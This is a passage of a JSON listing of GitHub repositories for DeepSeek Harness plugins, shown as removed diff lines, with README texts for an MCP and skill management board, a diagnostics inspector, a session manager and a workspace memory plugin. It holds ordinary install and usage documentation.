-      "readme_text": "# dsh-skill-mcp-board — 军械库 / Armory\n\n中文 | [English](README.en.md)\n\n> **DeepSeek Harness 的一体化管理看板**：MCP 服务器 · 技能 · 工具使用账本 · 三大市场（WorkBuddy 连接器 316 个 / 内置精选 47 个 / SkillHub 技能 19 万+），浏览、搜索、一键安装。\n> 本项目 fork 并改写自 [Imzl-zl/dsh-mcp-manager-ui](https://github.com/Imzl-zl/dsh-mcp-manager-ui)（MIT），\n> 从纯 MCP 管理面板升级为 **MCP + 技能 + 市场 + 工具账本** 四合一看板。\n\n<p align=\"center\">\n  <a href=\"https://github.com/2026heshao/dsh-skill-mcp-board/stargazers\"><img src=\"https://img.shields.io/github/stars/2026heshao/dsh-skill-mcp-board?style=social\" alt=\"stars\"></a>\n  <a href=\"https://github.com/2026heshao/dsh-skill-mcp-board/releases\"><img src=\"https://img.shields.io/github/v/release/2026heshao/dsh-skill-mcp-board?label=release\" alt=\"release\"></a>\n  <a href=\"./LICENSE\"><img src=\"https://img.shields.io/badge/license-MIT-green\" alt=\"license\"></a>\n  <img src=\"https://img.shields.io/badge/DSH-%3E%3D0.1.5--rc.1-blue\" alt=\"DSH\">\n  <a href=\"https://github.com/topics/dsh-plugin\"><img src=\"https://img.shields.io/badge/topic-dsh--plugin-8b5cf6\" alt=\"topic: dsh-plugin\"></a>\n</p>\n\n## 一键安装\n\n```sh\ndsh plugin --profile web add github:2026heshao/dsh-skill-mcp-board\n```\n\n装完**重启 DSH**，侧栏顶部「全局面板」里点 **技能 · MCP**（或右下角悬浮按钮）。桌面端装在 `desktop` profile 时把 `--profile web` 换成 `--profile desktop`。\n\n## 它解决什么\n\n| 痛点 | 本插件的做法 |\n|---|---|\n| MCP 配置要手改 YAML，改完不知道连没连上 | 可视化面板：状态、工具 Schema、启停、重连，全局与项目双作用域，项目级改完即对存活会话生效 |\n| 装技能要去各处翻 `SKILL.md` 仓库 | **市场直连**：SkillHub 19 万+ 技能、WorkBuddy 316 个连接器、47 个一手核实的内置服务，搜索/筛选/一键安装，逐文件 sha256 校验 |\n| 每个 MCP 的工具描述都在吃上下文 token，零调用的工具白白占位 | **工具裁缝**：扫描本机会话日志统计每个工具的调用/错误/延迟，死工具清单一键禁用 |\n| 从 Claude/Cursor/VS Code 迁移要逐条抄配置 | 自动检出 11 种客户端的本机配置，预览后一键导入 |\n\n## 界面预览\n\n### 全局管理面板\n\n![MCP 管理面板](docs/images/mcp-manager-overview.png)\n\n### 项目作用域（`.dsh/mcp.json`）\n\n![项目 MCP](docs/images/mcp-manager-workspace.png)\n\n### 连接详情与新增\n\n![MCP 连接详情](docs/images/mcp-manager-detail.png)\n\n![新增 MCP](docs/images/mcp-manager-add.png)\n\n## 功能\n\n- 查看每个 MCP 的状态、传输方式、连接参数与工具列表；展开工具可看完整输入 JSON Schema（必填/可选、类型、枚举、默认值与原始 JSON）\n- 按传输方式（HTTP/stdio）与状态筛选，按名称/命令/URL 搜索\n- 启用、禁用、重连、添加、编辑、移除；需要时用眼睛临时揭示被掩码的凭据并一键复制\n- **全局 + 项目双作用域**：全局写 Web profile，一次注册所有项目可用；项目写该项目 `.dsh/mcp.json`，只该项目会话可见；项目里还能「屏蔽」某个全局 MCP\n- **两个入口，同一个面板**：右下角悬浮按钮（可拖拽、记忆位置）与官方侧栏入口（展开态在「设置」上方显示「MCP」，收起成 56px 轨道时只剩图标）共享同一开关状态；面板右上角「入口」可以把两者只留一个（不能都关）\n- **MCP 市场**：47 个逐条一手核实过的服务，分 10 类（搜索、开发工具、安全与逆向、数据库与数据、AI 与知识、浏览器自动化、云与基础设施、效率协作、文件与本地、通讯）。搜索为主操作，配分类与「只要免密钥」筛选、排序、卡片直接安装；每条如实标注免费额度与需要准备什么（密钥 / 连接信息 / 装完还得改的参数）。已配置的只识别并跳过，不覆盖\n- 导入本机其他客户端的 MCP 配置：自动检测 Claude Code、Codex（`config.toml`）、OpenCode（含 `.jsonc`）、pi、Claude Desktop、Cursor、Windsurf、VS Code、Gemini CLI、Roo Code 与跨工具的共享配置，逐个列出，点一条即导入；也能粘贴 Claude/Cursor/Cline/Roo 的 `mcpServers` 或 VS Code 的 `servers` JSON。写入前预览，支持「合并（同名更新）」与「替换」\n- 跟随 DSH 深色/浅色主题，适配窄屏与移动宽度\n- 更新提示与**一键升级**：有新版时在面板顶部显示可关闭的提示条（每天最多查一次，可用 `DSH_MCP_MANAGER_DISABLE_UPDATE_CHECK` 关闭）。点了「升级」才动，**不会自动升级**；升级由 DSH 官方的 pluginManager 执行，装完提示重启宿主生效。用 `link:` / `file:` / `github:` 装的本地开发副本不给按钮（那会把链接换成 npm 包）\n- **升级后主动说一次变了什么**：版本变了后第一次打开面板弹一张小卡片，列出本次更新内容，并指路新功能在哪（例如「入口」开关在面板右上角）；确认一次后不再提示，不联网、不发任何数据\n- **工具裁缝**（1.7.0 新增）：扫描本机会话日志（只解析 `tool/call` / `tool/result` 两类事件，不读消息正文），统计每个工具近 7/30/90 天的调用次数、错误率与最后使用时间；同时按当前注册表估算每个工具 Schema 每轮请求占用的上下文 token。窗口内零调用的 MCP 工具自动进「死工具清单」，行内可一键禁用/启用对应服务器（复用官方写链，随时可恢复）。全程只读，多帧 zstd 日志逐帧解析、个别帧损坏跳过不中断\n- **WB 市场（直连安装，1.8.0 新增）**：看板第四个分类，两个市场一处浏览——\n  - **连接器（MCP）**：直读 WorkBuddy 官方分发 ZIP（`static.workbuddy.cn`，与 WorkBuddy 桌面端同一数据源），316 个连接器按需解析；可安装的 242 个（streamable-http 为主），CLI 型 / 需 WorkBuddy token 注入的 74 个如实标注「仅展示」并给出原因。安装 = 把该连接器的 `mcpServers` 合并写入 MCP 配置，与「导入 JSON」同一链路（准入、同名跳过、entry id 预留一致），全局与项目作用域都可选；ZIP 按 ETag 缓存在 `~/.dsh/wb-market/`，解压用 Node 内置 zlib，**零新增运行时依赖**\n  - **技能（SkillHub）**：直读 SkillHub 公开 API（`api.skillhub.cn`，19 万+ 技能），支持搜索（`keyword`）、排序（下载/安装/星标/评分）、分页；详情含发布方认证与安全扫描状态。安装 = 逐文件下载并按清单 sha256 校验后写入 `~/.agents/skills/`（与官方 skill 子系统同一发现范围），装完即刻生效；已装的显示「已安装」，可一键卸载、重装即更新\n  - 技能版权归原作者所有；两个均为第三方接口，字段可能随上游改版变化（面板顶部有常驻说明）\n\n## 安装\n\n```sh\ndsh plugin --profile web add github:2026heshao/dsh-skill-mcp-board\n```\n\n装完**重启 `dsh web`**（桌面端把 `--profile web` 换成 `--profile desktop`）。升级：换新版 tag 重新 `add`，或在面板「一键升级」提示条上直接点。卸载（不会删除 profile 里已有的 MCP 条目）：\n\n```sh\ndsh plugin --profile web remove dsh-skill-mcp-board\n```\n\n细节、本地开发安装与故障排查见 [安装与升级](docs/installation.md)。\n\n> 不要把 `mcp-manager-ui` 手工插进 profile 的 `cordis.patch.yml`、Agent preset 或额外的 `--patch` 文件——插件命令已经完成这件事，重复装配会明确报错。\n\n## 使用\n\n### 打开面板\n\n两个入口，同一个面板：\n\n- **右下角悬浮按钮**：可拖拽移动，位置会被记住；\n- **侧栏底部「MCP」**：展开态在「设置」上方，侧栏收起成 56px 轨道时只剩图标。\n\n面板浮在会话之上，关掉它（右上角「关闭」或 Esc）不会影响会话。\n\n两个入口都能单独关掉：面板右上角「入口」里选 `悬浮按钮 + 侧栏入口`（默认）/ `仅悬浮按钮` / `仅侧栏入口`。**不能两个都关**——面板只能从这两个入口打开，所以这是一个三选一，而不是两个独立的开关。选择存在浏览器本地（localStorage），换浏览器或清缓存要重选一次。\n\n### 全局 vs 项目\n\n顶部标签页在「全局」与各项目之间切换：\n\n| 标签页 | 存哪 | 谁可见 | 改动何时生效 |\n|---|---|---|---|\n| 全局 | Web profile 的 `cordis.patch.yml` | 所有项目 | DSH 热加载，通常立即生效 |\n| 某项目 | 该项目 `.dsh/mcp.json` | 只该项目会话 | 写盘即生效（见下） |\n\n`serverName` 按作用域判重：不同项目之间、全局与项目之间**可以同名**，各自独立连接；同一作用域内不能重名。\n\n### 常用操作\n\n在列表行或详情页里：\n\n- **开关**：启用 / 禁用（全局写 profile 补丁的 `disabled`，项目写 `.dsh/mcp.json`）；\n- **重连**：全局条目重载 loader 条目；项目连接会拆掉旧连接、按当前配置重建并重新投射给存活会话（`mcp-client` 的重连预算耗尽后必须靠它恢复）；\n- **编辑 / 移除**：移除只影响当前作用域；\n- **屏蔽**（项目页里对全局 MCP）：写 `exclude`，该项目的新会话不再看到它——全局实例仍在跑，所以不影响其他项目。\n\n### 添加 MCP\n\n三条路，都从面板顶部工具栏进：\n\n1. **添加 MCP**：表单填 `command`/`args`/`env`/`cwd`（stdio）或 `url`/`headers`（HTTP），可设调用超时、启动失败策略与重连策略；常用服务器有预设模板可一键套用。\n2. **导入 JSON**：粘贴其他客户端的配置，先预览再写入。支持「合并（同名更新）」与「替换」，字段映射与限制见 [JSON 导入](docs/json-import.md)。\n3. **内置 MCP**：勾选未配置的项一次装好（Exa、Tavily、Firecrawl、Chrome DevTools、Playwright）。前三项有免密额度、不需要本地依赖；后两项是本地工具，需要 Node.js 与浏览器。已配置的项只识别并跳过，不会覆盖。\n\n### 看工具与敏感值\n\n详情页列出该 MCP 当前注册的工具；展开可看完整输入 Schema。凭据类字段默认掩码，点眼睛图标会向 Host 读取**有效运行值**（已解析过的环境变量）并临时显示，再点一次恢复；已显示的值可一键复制。编辑时若没实际改动输入，保存仍保留原来的引用写法，不会把密钥写回配置文件。\n\n## 配置生效时机（重要）\n\n| 作用域 | 修改后何时生效 |\n|---|---|\n| 全局 | DSH 热加载，通常立即生效（含运行中的会话） |\n| 项目 | **写盘即生效**：新增立刻挂上存活会话、删除立刻撤掉工具、改动就地重载连接（工具名不变） |\n\n项目 MCP 由本项目所有会话共用一份连接，配置写在 `.dsh/mcp.json`。面板保存的那一刻就会对齐到正在运行的会话，**不需要重开会话，也不需要重启 Host**；手工编辑该文件则在**下一次会话挂载**时被采纳。\n\n> **连接跟配置走，不跟会话走**：最后一个会话结束不会拆掉连接，它只进入空闲等待，下一次会话直接复用——这样\"要用的时候\"它已经就绪（这也是宿主自己的契约：工具必须在首轮之前出现）。两个旋钮写在 server 条目里：`idleTimeoutMs`（空闲保留多久，默认 5 分钟，`0` = 永不回收）与 `readyTimeoutMs`（挂载时等就绪的总预算，默认 5s，`0` = 不等）。字段速查与边界见 [设计与限制](docs/design.md#项目级专有字段dshmcpjson-里每个-server-可写)。\n>\n> **状态怎么看**：项目行把两件独立的事分开说，不合成一个状态。\n> - **连接在不在**：`已连接 · 当前无会话使用（连接保留，下次直接用）` / `已连接 · N 个会话在用` / `连接中…` / `连接失败` / `尚未建立连接（新会话自动挂载）`。\n> - **几个会话在用**：见上一行的 `N 个会话在用`；不再出现「待会话挂载」那种把两者压成一句、容易被读成\"还没连上\"的写法。\n>\n> **重连是必需出口**：mcp-client 的自动重连有次数上限，耗尽后它会注销工具并停止，只能靠重载配置或重启宿主恢复（它的 README 明写）。项目 MCP 又不是常驻服务，所以面板的「重连」按钮会拆掉旧连接、按当前配置重建，并重新投射给存活会话。\n\n## 常见问题\n\n**面板里显示「已禁用」，但模型调用报 `unknown tool \"mcp__xxx__...\"`**\n那个 MCP 被禁用了，所以它没有注册任何工具。在面板里点「启用」即可（全局会写 profile 补丁并热加载，项目写 `.dsh/mcp.json`、写盘即生效）。\n\n**那一行显示「挂载失败」「连接失败」或「作用域隔离失败」，怎么区分？**\n三类是不同的事，详情页会给出具体原因：**挂载失败** = **会话挂载阶段**（`agent/created` 监听器）就没挂上（变量求值为空、`failOnStartupError` 下启动失败、工具注册被拒）；**连接失败** = `mcp-client` 连不上或重连耗尽（原因取自它的日志）；**作用域隔离失败** = 连接正常但工具不在共享作用域层（宿主里出现了两份 `@deepseek-ai/dsh-scope`）。排查与原理见 [设计与限制](docs/design.md#连接状态语义)。\n\n**项目行那些状态文案分别是什么意思？**\n它们把两件独立的事分开说：**连接在不在** —— `已连接 · 当前无会话使用（连接保留，下次直接用）`（最后一个会话结束了，连接按空闲策略留着）/ `已连接 · N 个会话在用 · M 工具` / `连接中…` / `连接失败` / `尚未建立连接（新会话自动挂载）`；**几个会话在用** —— 就是那句里的 `N 个会话在用`。旧版本的「待会话挂载」正是把这两件事压成一句，所以容易被读成\"还没连上\"。\n\n**怎么升级？为什么面板没提示？**\n从 npm 装的直接 `dsh plugin --profile web update dsh-mcp-manager-ui` 就会升小版本，也可以直接点面板提示条上的「升级」（同一件事，免去敲命令）。面板的提示条只查 GitHub Releases、每天最多一次、可关闭、不会自己动；固定 tag 安装的用户不会自动跨版本，需要用新 tag 重新 `add`（见 [安装与升级](docs/installation.md)）。\n\n**改动会不会碰到我的其他配置？**\n不会。全局改动只动 profile 补丁里由 `@deepseek-ai/dsh-mcp-client` 声明、且由本插件管理的条目，保留其他插件条目、注释与 `!!js` 表达式；导入「替换」也只替换这一部分，不会删除其他 bundle 或 Agent preset 自带的 MCP。\n\n**卸载后我配置的 MCP 会消失吗？**\n卸载插件不会删除 profile 里已有的 `@deepseek-ai/dsh-mcp-client` 条目；项目的 `.dsh/mcp.json` 也留在原处（它本来就是普通 JSON 文件）。\n\n## 兼容性\n\n| 项目 | 已验证 |\n|---|---|\n| DeepSeek Harness | `0.1.5-rc.1` 及以上（已验证至 `0.2.0-rc.2`） |\n| Node.js | DSH 自带/支持的运行时 |\n| 平台 | Windows；Linux/macOS 使用同一 DSH Web 契约 |\n\n只支持 0.1.5 起（更早的版本缺少「按注册作用域判 `serverName` 唯一性」与「setup 传入 agent」两个能力），不为旧版本保留降级分支。原因与依赖细节见 [设计与限制](docs/design.md#兼容性与依赖细节)。\n\n## 开发\n\n```sh\nnpm test                              # 全部测试（含真机集成用例）\ndsh --profile web --dump-config       # 看 profile 的有效配置\ndsh web                               # 起 Web 做"
-    },
-    {
-      "full_name": "tree201/dsh-capability-inspector",
-      "html_url": "https://github.com/tree201/dsh-capability-inspector",
-      "description": "DeepSeek Harness Doctor and DSH runtime diagnostics for tools, models, skills, workspaces, sessions, plugins, and MCP troubleshooting",
-      "stars": 1,
-      "language": "TypeScript",
-      "pushed_at": "2026-08-13T17:45:14Z",
-      "topics": [
-        "agent-tools",
-        "capability-inspector",
-        "capability-matrix",
-        "deepseek-harness",
-        "diagnostics",
-        "dsh-doctor",
-        "dsh-plugin",
-        "mcp-troubleshooting",
-        "runtime-health-check"
-      ],
-      "categories": [
-        "工具/开发"
-      ],
-      "tags": [
-        "agent-tools",
-        "capability-inspector",
-        "capability-matrix",
-        "deepseek-harness",
-        "diagnostics",
-        "dsh-doctor",
-        "dsh-plugin",
-        "mcp-troubleshooting"
-      ],
-      "readme_text": "# DSH Capability Inspector\n\nEnglish | [简体中文](README.zh-CN.md)\n\n**A read-only runtime diagnostics and health-check plugin for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness).**\n\nDSH Capability Inspector registers an `inspect_dsh` tool that explains which capabilities are actually available to the calling agent and where a configuration or runtime problem may be occurring.\n\nIt is also useful when searching for a **DeepSeek Harness Doctor**, **DSH diagnostics**, **DSH capability matrix**, **plugin readiness checker**, or **MCP troubleshooting tool**.\n\n## What it checks\n\n- Node.js version, operating system, architecture, and working directory\n- Tools visible in the calling agent's scope\n- LLM providers and their model catalogs\n- Skills, providers, and invocation modes\n- Workspaces, directory status, and associated session counts\n- Session persistence availability\n- Missing capabilities and per-check errors\n\nThe plugin never returns API keys or other credential values. It does not change configuration and does not automatically repair failures.\n\n## Install\n\n### From GitHub\n\n```sh\ndsh plugin --profile web add github:tree201/dsh-capability-inspector\ndsh web\n```\n\nDeepSeek Harness is currently in developer preview. If pnpm asks for build-script authorization during a Git install, review the DSH plugin installation guidance and only authorize source you trust.\n\n### From a local checkout\n\n```sh\ndsh plugin --profile web add /absolute/path/to/dsh-capability-inspector\ndsh web\n```\n\n## Use\n\nAfter restarting DSH, ask the agent:\n\n> Inspect the current DSH runtime and summarize available capabilities and warnings.\n\nMore focused prompts also work:\n\n> List the tools and skills available to this agent.\n\n> Check model providers and model catalogs.\n\n> Check workspace and session persistence health.\n\nThe agent can call `inspect_dsh` with one of these scopes:\n\n- `summary` — full report; the default\n- `tools` — scoped tool catalog\n- `models` — providers and model catalogs\n- `skills` — skill catalog\n- `workspaces` — registered workspace health\n- `sessions` — session persistence health\n\n## Design boundaries\n\nThe first release uses supported, read-only DeepSeek Harness enumeration APIs.\n\n- It does not inspect private Cordis reflection state.\n- It does not expose credential values.\n- One failed provider or capability check does not fail the whole report.\n- It cannot inspect a plugin that failed before this plugin loaded.\n- It reports problems but does not automatically fix them.\n\n## Development\n\n```sh\npnpm install\npnpm run check\n```\n\nThe check command runs TypeScript type checking, unit tests, and the package build.\n\n## Machine-readable project summary\n\nSee [`llms.txt`](llms.txt) for a concise project description intended for search engines, AI coding agents, and repository-indexing tools.\n\n## Related search terms\n\nDeepSeek Harness plugin, DSH plugin, DeepSeek Harness Doctor, DSH Doctor, DSH diagnostics, MCP troubleshooting, agent capability inspector, capability matrix, runtime health check, plugin readiness.\n\n## License\n\nMIT\n"
-    },
-    {
-      "full_name": "wjackiedev/dsh-session-manager",
-      "html_url": "https://github.com/wjackiedev/dsh-session-manager",
-      "description": "Archived-session manager for the DeepSeek Harness Web GUI — restore and permanently delete session logs.",
-      "stars": 1,
-      "language": "JavaScript",
-      "pushed_at": "2026-09-20T07:27:05Z",
-      "topics": [
-        "cordis",
-        "deepseek-harness",
-        "dsh",
-        "dsh-plugin",
-        "nodejs",
-        "plugin",
-        "session-manager",
-        "web-ui"
-      ],
-      "categories": [
-        "皮肤/UI"
-      ],
-      "tags": [
-        "cordis",
-        "deepseek-harness",
-        "dsh",
-        "dsh-plugin",
-        "nodejs",
-        "plugin",
-        "session-manager",
-        "web-ui"
-      ],
-      "readme_text": "# dsh-session-manager\n\n[![CI](https://github.com/wjackiedev/dsh-session-manager/actions/workflows/ci.yml/badge.svg)](https://github.com/wjackiedev/dsh-session-manager/actions/workflows/ci.yml)\n[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)\n[![Node](https://img.shields.io/badge/node-%5E22.19.0%20%7C%7C%20%3E%3D24.0.0-brightgreen)](package.json)\n[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](./CONTRIBUTING.md)\n\nDeepSeek Harness Web GUI 的**会话管理**插件：在 **设置 → 会话管理** 里列出全部会话（含已归档），支持筛选、归档/恢复，以及把会话的本地日志目录物理删除。\n\nharness 自带的会话侧栏只能「归档」（单向隐藏），没有取消归档，也没有删除。本插件补齐：\n\n- **全量列表** —— harness 的会话列表本身包含已归档会话（侧栏是用归档集过滤掉的），所以这里能一并列出，并给出「已归档」标记。\n- **筛选 / 搜索** —— 全部 / 活动 / 已归档 / 运行中 / 子代理 五种筛选，加上按标题、目录、id、工作区的本地子串过滤。\n- **归档与恢复** —— 归档走 harness 的注册表归档动作；恢复改注册表的归档集合（`domain/changed` 会让侧栏实时同步）。恢复前会确认会话的日志仍在磁盘上：文件已被删除的会话**拒绝恢复**，否则会把一个点开就 ENOENT 的空壳放回侧栏（见下）。\n- **删除** —— 物理移除会话的本地日志目录，**不可逆**；删除前有二次确认。\n- **级联删除子代理** —— 删除父会话时连带清理其子代理会话（默认开启），行上显示 `+N 子代理`，确认框会写明将连带删除多少个。见下。\n- **安全护栏** —— 删除权限只看**目标会话自身是否已归档**：已归档 = 可以直接删（若还在运行，先中止它的当前回合）；未归档 = 拒绝，并提示先去侧栏归档。见下。\n- **子代理会话** —— 默认**不显示**（与侧栏一致，见下），需要时切到「子代理」筛选查看，行上标出父会话 id。\n\n```\nhost:   sessionManager 服务（facts / remove / removeMany / archive / unarchive）\n        └─ 信任围栏 HTTP 路由 /session-manager/api/*（服务未被代理时的载体）\nclient: 设置页「会话管理」（settings.section）+ 删除确认弹窗\n```\n\n## 安装\n\n从本地路径（开发时最常用）：\n\n```sh\ndsh plugin --profile web add /绝对路径/dsh-session-manager\n# 重启 dsh web，然后打开 设置 → 会话管理\n```\n\n从 GitHub 直接安装：\n\n```sh\ndsh plugin --profile web add git+https://github.com/wjackiedev/dsh-session-manager.git\n```\n\n卸载：\n\n```sh\ndsh plugin --profile web remove dsh-session-manager\n```\n\n> 本包在 `package.json` 里保留了 `\"private\": true`，避免误发布到 npm；从 git 或本地路径安装不受影响。\n\n## 开发\n\n没有构建步骤，也没有需要安装的依赖（`@deepseek-ai/cordis` 是 peer dependency，由 DSH 宿主提供）：\n\n```sh\ngit clone git@github.com:wjackiedev/dsh-session-manager.git\ncd dsh-session-manager\nnpm test\n```\n\n测试是普通的 `node` 脚本，会打印 `PASS` / `FAIL` 行：\n\n```sh\nnpm run test:host      # 只跑宿主策略测试\nnpm run test:client    # 只跑客户端 ghost 行测试\n```\n\n改动代码前请先读 [AGENTS.md](./AGENTS.md)——它记录了架构、六条硬性不变量（fork 子会话必须存活、`SESSION_GONE` 拒绝恢复已删除会话等）以及代码与提交约定。\n\n## 权限边界\n\n- 只读宿主已有的持久化状态：`sessionPersistence.list()/stat()/locate()`。\n- 写：`workspaceRegistry.archiveSession()` / `setState()`（归档集合），以及删除会话日志目录。\n- 不注册任何面向模型的工具，不写会话日志，不触碰会话之外的任何文件。\n- 客户端 bundle 只 `require` 冻结基座里的模块（`react`、`@deepseek-ai/dsh-client-ui-primitives`），没有非基座 external，也没有构建步骤。\n\n## 级联删除子代理会话\n\n删除一个会话时，默认连带删除它的**子代理后代**（整棵子树，深度不限）。三个要点：\n\n1. **判别条件是 `origin === 'subagent'`，不是 `parentSession`。** `SessionHeader.parentSession` 同时也是 **fork 血缘字段**（\"the session this one was forked from\"）——fork 出来的分叉会话是普通顶层会话，有自己的工作区记账，用户从没要求删它。只按 `parentSession` 级联会把它们一起删掉。单测里专门锁了这条（`FORK` 子会话必须留下）。\n2. **深度优先 + 父会话最后删。** 顺序是「最深的子代理 → … → 直接子代理 → 目标会话」，中途失败时留下的是仍在界面上的父会话，而不是一堆孤儿子代理。\n3. **全有或全无，但闸门只看目标会话自己。** 判定是否可删只看**目标会话是否已归档**：已归档 → 整棵子树都可删；未归档 → 只要有成员仍在进程中活动，整批拒绝（错误码 `SESSION_LIVE`，回报具体哪些 id 忙），不会删一半。子代理不会被单独归档（它们在侧栏里根本不是可管理的行），所以闸门**不能**下放到子代理，否则\"归档父会话\"就永远删不掉了。\n\n`remove(id, { cascade: false })` 可以只删目标本身（HTTP 侧对应 `{ id, cascade: false }`）；单删子代理会话时同样会对它的后代级联。删除完成后界面会用 host 返回的 `childrenRemoved` 汇报「已删除 N 个会话（含 M 个子代理）」。\n\n## 已归档就能删，未归档不能删\n\n规则的落点是**目标会话自己的归档状态**，不是它是否常驻内存：\n\n| 目标 | 在进程中活动 | 结果 |\n|---|---|---|\n| 已归档 | 否 | 直接删 |\n| 已归档 | 是（运行中 / 已打开） | **可删**：先 `agent.cancel({ kind: 'disposed' })` 中止当前回合，再删文件 |\n| 未归档 | 否 | 直接删 |\n| 未归档 | 是 | **拒绝**（`SESSION_LIVE`），提示先去侧栏 ⋯ 里归档 |\n| 未归档 | 子代理在活动 | 拒绝（提示先归档目标会话） |\n\n为什么这么定：\n\n1. **\"归档\"就是\"我不用了\"的显式声明。** harness 的归档是单向隐藏，用户归档之后唯一的诉求就是清理掉它；此时再以\"还在内存里\"为由拒绝，等于让归档变成一个无法收尾的操作。\n2. **归档会话本来就看不见。** 我最初拒删的理由是\"删了但侧栏还在显示\"——而归档集已经把会话从所有分组视图里隐藏了，这条理由对归档会话不成立。\n3. **未归档的仍然拒删是有必要的**：`ctx.sessions` 里常驻的会话即使文件被删，harness 的列表仍会继续返回它（`ApiSessionList.list` 对 live 会话优先于索引），于是侧栏里会出现一个点开是空壳的行。归档这一动作正好把这个残影藏起来。\n\n技术上做不到的部分：`AgentHandle.dispose()` 是 capability，只有创建该 agent 的持有者能拆，`ctx.agents.get(id)` 只给裸 `Agent`，所以**插件无法把会话从进程里真正卸载**。能做到的是 `cancel()` + 有上限的 `whenIdle()`（保证之后不再往已 unlink 的 inode 写），进程内那条 pending 记录要等重启 `dsh web` 才消失——这也是为什么 `facts()` 要额外暴露 `onDisk`，由客户端用它把\"文件已不在\"的行立即从管理页隐去。删除成功后的提示会写明「已中止 N 个运行中的会话」。\n\n## 删除后的残影与恢复闸门\n\n删除只动磁盘，进程/客户端里可能还留着一份\"残影\"，所以两个入口都要挡：\n\n1. **管理页不再列出残影。** 客户端列表来自 harness 的会话 store，删除后它仍可能保留一条摘要（`ApiSessionList.list` 对常驻会话优先内存条目；客户端的 ordered-baseline 合并又会跨重连保留旧摘要）。此时 host 的 `facts()` 里已经**没有这一行**了——所以判定条件是「缺 fact **或** `onDisk === false`」，两者都从管理页隐去，顺带把这类 ghost id 从所有统计里剔除。页面还会对这类 ghost id 调用一次 `sessions.refresh()`，把侧栏里的残影也一并冲掉。\n2. **恢复必须日志仍在。** `unarchive()` 先 `sessionPersistence.stat(id)`：返回快照 = 日志在磁盘上（或仍是会落盘的 pending create），允许恢复；`undefined` = 文件确实没了，直接拒绝（错误码 `SESSION_GONE`）。已删除的会话仍留在归档集合里——它不影响任何界面，反而正好把可能残留的客户端条目继续挡在侧栏之外。\n\n## 「未归属工作区」是什么意思\n\n就是侧栏里那个「未分组」组（`group.ungrouped`）：该会话不在任何工作区记录的 `sessionIds` 记账名单里。插件行上会显示 `(未归属工作区)`。三种来源：\n\n1. **子代理会话** —— `session.create({ workspaceId })` 是唯一的记账入口，而子代理由父 agent 直接派生、不走这条 RPC，所以永远不记账。插件默认隐藏它们（harness 侧栏同样隐藏：`tree.ts` 的 `sessionVisible()` 第一条就是 `origin !== 'subagent'`），切到「子代理」筛选才可见。\n2. **以 `cwd` 而不是工作区创建的会话** —— `session.create` 只接受 `workspaceId` 或 `cwd` 二选一，传 `cwd` 时不记账（headless / ACP / SDK / CLI 路径）。\n3. **工作区注册被删，或 cwd 失效** —— harness 的\"删除工作区\"只删注册、保留日志（其会话就落到未分组）；而 `WorkspaceEntity.sessionIds` 只投影 canonical cwd 等于记录路径的会话，目录被删/改名/软链变化都会被过滤掉，host 启动日志里会出现 `filtered session ... from membership` 警告。\n\n## 已知代价（\"不改 harness\" 的边界）\n\n- 删除后 workspace 记录里的 `sessionIds` 会留一个死 id。它会被 header 索引过滤、不显示，但没有公开 API 可以摘掉（`WorkspaceRegistry.requireTable()` 是私有的）。\n- 投影缓存（`<dsh-home>/storages/session_projcache/sessions/<id>.json`）会残留一条；读取侧有 session identity 校验，永远不会被误用。\n- 上述两项不影响使用，只是磁盘上的留痕。\n\n## 兼容性\n\n- 需要当前 `sessionPersistence.list()` 返回 `{ header, revision, sizeBytes }` 快照的 DSH（插件内部做了 `snapshot.header ?? snapshot` 兼容读取）。\n- 依赖的宿主面：`sessionPersistence`、`workspaceRegistry`、`sessions`（`agents` 为可选查找）。\n- 宿主的 HTTP 路由注册面：`webServer.register({ kind: 'prefix', path, handler })`。\n\n## 参与贡献\n\n欢迎 issue 与 PR：\n\n- 提交前请阅读 [CONTRIBUTING.md](./CONTRIBUTING.md)（开发环境、测试要求、提交信息规范）与 [AGENTS.md](./AGENTS.md)（架构与硬性不变量）。\n- 架构或行为变更请同步更新 [CHANGELOG.md](./CHANGELOG.md) 的 `## [Unreleased]`。\n- 安全问题**不要**开公开 issue，请按 [SECURITY.md](./SECURITY.md) 私密上报。\n- 本项目采用 [Contributor Covenant 行为准则](./CODE_OF_CONDUCT.md)。\n\n## License\n\n[MIT](./LICENSE) © 2026 Jackie Wang (wjackiedev)\n"
-    },
-    {
-      "full_name": "lengfengng1-ai-architect/dsh-workspace-memories",
-      "html_url": "https://github.com/lengfengng1-ai-architect/dsh-workspace-memories",
-      "description": "Per-workspace persistent memory plugin for DeepSeek Harness (DSH): sidebar panel, automatic system-prompt injection, and an agent tool to save memories",
-      "stars": 1,
-      "language": "JavaScript",
-      "pushed_at": "2026-10-13T09:09:42Z",
-      "topics": [
-        "agent-memory",
-        "ai-agent",
-        "cordis",
-        "deepseek",
-        "deepseek-harness",
-        "dsh",
-        "dsh-plugin",
-        "llm"
-      ],
-      "categories": [
-        "Agent/智能体"
-      ],
-      "tags": [
-        "agent-memory",
-        "ai-agent",
-        "cordis",
-        "deepseek",
-        "deepseek-harness",
-        "dsh",
-        "dsh-plugin",
-        "llm"
-      ],
-      "readme_text": "# dsh-workspace-memories\n\nEnglish | [中文](README.zh.md)\n\n[![](https://img.shields.io/badge/powered_by-dsh-4D6BFE?style=flat-square&logo=deepseek&logoColor=white)](https://github.com/deepseek-ai/deepseek-harness)\n[![](https://img.shields.io/npm/v/dsh-workspace-memories?style=flat-square)](https://www.npmjs.com/package/dsh-workspace-memories)\n[![](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)\n\n**Per-workspace persistent memory for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (DSH)** — a plugin that gives every workspace its own durable memory files, injects them into every session running in that workspace, and lets both you and the agent manage them.\n\n## Why this plugin exists\n\nDSH agents are stateless across sessions: everything a session \"learns\" — your project's decisions, conventions, hard-won debugging facts — lives only in that conversation's context and is gone when it ends. The built-in mechanism for durable knowledge is `AGENTS.md`, but it is a static, project-owned instruction file: the agent cannot update it on its own, and **some things should not live in the project folder at all** — server addresses and topologies, local environment quirks, machine-specific paths, personal working conventions. Anything under the project tree risks being committed to git by accident.\n\nThis plugin closes that gap with a small, explicit memory loop whose default storage is **outside the project directory**:\n\n1. **Every workspace gets a memory directory** — by default under the DSH data directory (`~/.dsh/workspace-memory/<workspace>/`), never inside the repo. Plain Markdown you can read, diff, and back up. (An opt-in `workspace` storage 